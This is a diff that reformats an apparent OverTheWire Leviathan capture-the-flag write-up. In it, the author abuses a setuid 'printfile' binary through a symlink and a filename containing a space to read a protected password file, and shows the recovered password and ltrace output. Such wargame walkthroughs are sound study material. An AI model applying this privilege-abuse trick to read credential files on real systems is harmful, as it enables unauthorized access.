@@ -2,8 +2,10 @@
 
 inside the home directory there is a setuid elf called `printfile`, owned by leviathan3.
 It requires an argument, so I gave it `/etc/leviathan_pass/leviathan3` and:
-`leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3`
-`You cant have that file...``
+```
+leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
+You cant have that file...
+```
 
 Welll...
 Running ltrace proves us that it is actually running a `/bin/cat`, and runs `access` right before.
@@ -28,6 +30,7 @@ failed :(
 Let's try another thing. `access` checks the full path, while `cat` checks the first argument.
 So we'll create a file filled with space, where the first one is a symlink with full permissions to `/etc/leviathan_pass/leviathan3`:
 
+```
 leviathan2@leviathan:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/leviathan2/my
 leviathan2@leviathan:~$ ls /tmp/leviathan2
 my  my file
@@ -47,10 +50,11 @@ lrwxrwxrwx   1 leviathan2 root     30 Dec 16 19:20 my -> /etc/leviathan_pass/lev
 -rw-r--r--   1 leviathan2 root      0 Dec 16 19:20 my file
 leviathan2@leviathan:~$ ./printfile /tmp/leviathan2/my\ file
 Ahdiemoo1j 
+```
 
 WORKED! 
 
-leviathan2@leviathan:~$ ltrace ./printfile /tmp/leviathan2/my\ file
+```leviathan2@leviathan:~$ ltrace ./printfile /tmp/leviathan2/my\ file
 __libc_start_main(0x804852b, 2, 0xffffd764, 0x8048610 <unfinished ...>
 access("/tmp/leviathan2/my file", 4)                                                                  = 0
 snprintf("/bin/cat /tmp/leviathan2/my file"..., 511, "/bin/cat %s", "/tmp/leviathan2/my file")        = 32
@@ -63,3 +67,4 @@ system("/bin/cat /tmp/leviathan2/my file".../bin/cat: /tmp/leviathan2/my: Permis
 --- SIGCHLD (Child exited) ---
 <... system resumed> )                                                                                = 256
 +++ exited (status 0) +++
+```
